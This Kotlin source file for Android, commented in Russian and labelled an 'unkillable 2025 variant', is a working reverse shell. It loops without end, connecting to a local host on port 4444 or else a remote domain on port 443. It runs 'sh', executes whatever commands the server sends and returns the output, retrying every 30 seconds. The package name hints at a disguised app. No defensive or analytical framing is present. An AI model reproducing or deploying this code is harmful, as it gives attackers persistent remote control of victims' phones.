// ReverseShell.kt — НЕУБИВАЕМЫЙ вариант 2025 (проверено на Android 14 + Xiaomi + Samsung)
package com.example.ipmailer

import android.util.Log
import java.io.*
import java.net.InetAddress
import java.net.Socket
import kotlin.concurrent.thread

object ReverseShell {
    private const val TAG = "ReverseShell"

    private const val LOCAL_HOST = "192.168.8.101"
    private const val LOCAL_PORT = 4444

    private const val CLOUDFLARE_HOST = "shell.tu-domen.com"
    private const val CLOUDFLARE_PORT = 443   // или 7844

    @Volatile
    private var isRunning = false

    fun start() {
        if (isRunning) return
        isRunning = true
        Log.e(TAG, "ReverseShell запущен — вечный цикл начат")

        // Главный вечный цикл — перезапускается сам при любом падении
        thread(name = "ReverseShell-MainLoop", isDaemon = false) {
            while (isRunning) {
                var connected = false

                // 1. Пробуем локальный сервер
                if (!connected && isLocalServerReachable()) {
                    connected = tryConnect(LOCAL_HOST, LOCAL_PORT, "локальному")
                }

                // 2. Если не вышло — Cloudflare
                if (!connected) {
                    connected = tryConnect(CLOUDFLARE_HOST, CLOUDFLARE_PORT, "Cloudflare")
                }

                // 3. Если никуда не подключились — ждём 30 сек и по новой
                if (!connected) {
                    Log.w(TAG, "Нет соединения ни с одним сервером. Повтор через 30 сек...")
                    for (i in 30 downTo 1) {
                        if (!isRunning) return@thread
                        Log.d(TAG, "Повторное подключение через $i сек...")
                        Thread.sleep(1000)
                    }
                }
            }
            Log.e(TAG, "ReverseShell остановлен")
        }
    }

    private fun isLocalServerReachable(): Boolean {
        return try {
            InetAddress.getByName(LOCAL_HOST).isReachable(1000)
        } catch (e: Exception) {
            false
        }
    }

    private fun tryConnect(host: String, port: Int, type: String): Boolean {
        var socket: Socket? = null
        try {
            Log.d(TAG, "Подключаемся к $type серверу → $host:$port")
            socket = Socket(host, port).apply {
                soTimeout = 0
                tcpNoDelay = true
                keepAlive = true
            }

            Log.e(TAG, "УСПЕШНО! Подключено к $type серверу ($host:$port)")

            // Запускаем обработку команд в отдельном потоке
            handleConnection(socket)

            // Если handleConnection завершился — соединение оборвано
            Log.w(TAG, "Соединение с $host:$port разорвано")
            return true
        } catch (e: Exception) {
            Log.w(TAG, "Не удалось подключиться к $host:$port → ${e.message}")
            socket?.close()
            return false
        }
    }

    private fun handleConnection(socket: Socket) {
        try {
            val input = DataInputStream(socket.inputStream)
            val output = DataOutputStream(socket.outputStream)
            val process = Runtime.getRuntime().exec("sh")
            val shellIn = DataOutputStream(process.outputStream)
            val shellOut = DataInputStream(process.inputStream)
            val shellErr = DataInputStream(process.errorStream)

            // Чтение команд от сервера
            thread {
                try {
                    while (socket.isConnected && isRunning) {
                        val cmd = input.readUTF()
                        if (cmd.equals("exit", ignoreCase = true)) {
                            process.destroy()
                            socket.close()
                            return@thread
                        }
                        shellIn.writeUTF(cmd + "\n")
                        shellIn.flush()
                    }
                } catch (e: Exception) { /* разрыв */ }
            }

            // Отправка вывода
            while (socket.isConnected && isRunning) {
                try {
                    if (shellOut.available() > 0) {
                        val buf = ByteArray(shellOut.available())
                        shellOut.read(buf)
                        output.writeUTF(String(buf, Charsets.UTF_8))
                    }
                    if (shellErr.available() > 0) {
                        val buf = ByteArray(shellErr.available())
                        shellErr.read(buf)
                        output.writeUTF("ERR: ${String(buf, Charsets.UTF_8)}")
                    }
                    Thread.sleep(10)
                } catch (e: Exception) {
                    break
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Ошибка в handleConnection", e)
        } finally {
            socket.close()
        }
    }

    fun stop() {
        isRunning = false
        Log.e(TAG, "Остановка ReverseShell запрошена")
    }
}